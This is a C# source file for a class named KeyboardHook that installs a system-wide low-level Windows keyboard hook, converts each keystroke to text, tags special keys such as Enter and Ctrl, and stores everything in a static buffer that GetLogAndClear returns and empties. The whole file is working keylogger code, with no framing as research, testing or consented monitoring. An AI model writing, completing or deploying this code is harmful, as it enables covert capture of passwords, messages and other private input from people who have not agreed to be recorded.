using System;
using System.Runtime.InteropServices;
using System.Text;

public class KeyboardHook
{
    [DllImport("user32.dll")]
    static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

    [DllImport("user32.dll")]
    static extern bool GetKeyboardState(byte[] lpKeyState);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

  
    private const int WH_KEYBOARD_LL = 13; 
    private const int WM_KEYDOWN = 0x0100;


    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private IntPtr _hookID = IntPtr.Zero;
    private LowLevelKeyboardProc _proc;

    
    private static StringBuilder keyLog = new StringBuilder();

   
    public void StartHook()
    {
        _proc = HookCallback;

        using (System.Diagnostics.Process curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (System.Diagnostics.ProcessModule curModule = curProcess.MainModule)
        {
            _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    public void StopHook()
    {
        UnhookWindowsHookEx(_hookID);
    }


    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            System.Windows.Forms.Keys key = (System.Windows.Forms.Keys)vkCode;

            if (key == System.Windows.Forms.Keys.Enter)
            {
                keyLog.Append("\n[ENTER]\n");
            }
            else if (key == System.Windows.Forms.Keys.Space)
            {
                keyLog.Append(" ");
            }
            else if (key == System.Windows.Forms.Keys.LControlKey || key == System.Windows.Forms.Keys.RControlKey)
            {
                keyLog.Append("[CTRL]");
            }
          
            else
            {
             
                byte[] keyState = new byte[256];
                GetKeyboardState(keyState);

               
                StringBuilder outChar = new StringBuilder(256);

                
                if (ToUnicodeEx((uint)vkCode, 0, keyState, outChar, outChar.Capacity, 0, IntPtr.Zero) == 1)
                {
                    
                    keyLog.Append(outChar.ToString());
                }
                
                else if (key.ToString().Length > 1 && key.ToString().Length < 10)
                {
                   
                    if (!key.ToString().Contains("Oem"))
                    {
                        keyLog.Append($"[{key.ToString().ToUpper()}]");
                    }
                }
            }
        }
        return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
    }


    public static string GetLogAndClear()
    {
        string currentLog = keyLog.ToString();
        keyLog.Clear(); 
        return currentLog;
    }
}